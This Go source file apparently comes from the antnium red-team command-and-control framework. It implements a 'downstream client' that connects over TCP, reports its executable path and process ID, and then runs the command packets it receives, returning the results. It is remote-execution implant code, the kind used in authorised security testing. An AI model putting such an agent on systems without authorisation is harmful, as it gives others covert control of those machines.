package downstreamclient

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"

	"github.com/dobin/antnium/pkg/executor"
	log "github.com/sirupsen/logrus"
)

type DownstreamClient struct {
	conn net.Conn
}

func MakeDownstreamClient() DownstreamClient {
	executor := DownstreamClient{}
	return executor
}

func (e *DownstreamClient) StartClient(destination string) {
	if destination == "" {
		destination = "localhost:50000"
	}
	fmt.Println("DownstreamClient: connect to: " + destination)

	conn, err := net.Dial("tcp", destination)
	if err != nil {
		log.Error("Could not connect: " + err.Error())
		return
	}
	log.Info("DownstreamClient: Connected")

	// Send initial line
	ex, err := os.Executable()
	if err != nil {
		log.Error("Error: " + err.Error())
		return
	}
	pid := strconv.Itoa(os.Getpid())
	line := ex + ":" + pid + "\n"
	_, err = conn.Write([]byte(line))
	if err != nil {
		log.Error("Error")
		return
	}
	// no answer required
	e.conn = conn

	e.Loop()
}

func (e *DownstreamClient) Shutdown() {
	if e.conn != nil {
		e.conn.Close()
	}
}

func (e *DownstreamClient) Loop() {
	executor := executor.MakeExecutor()

	for {
		// Read
		jsonStr, err := bufio.NewReader(e.conn).ReadString('\n')
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Error("Could not read: " + err.Error())
			break
		}
		packet, err := DecodePacket(jsonStr)
		if err != nil {
			log.Error("Error: ", err.Error())
			continue
		}

		// Execute
		packet, err = executor.Execute(packet)
		if err != nil {
			log.WithFields(log.Fields{
				"packet": packet,
				"error":  err,
			}).Info("Error executing packet")

			// TODO ERR
		}

		// Answer: Go to JSON
		packetEncoded, err := EncodePacket(packet)
		if err != nil {
			log.Error("Error: ", err.Error())
		}
		n, err := e.conn.Write(packetEncoded)
		if err != nil {
			log.Error("Error")

			// TODO ERR
		}
		e.conn.Write([]byte("\n"))
		fmt.Printf("Written: %d bytes", n)
	}
}
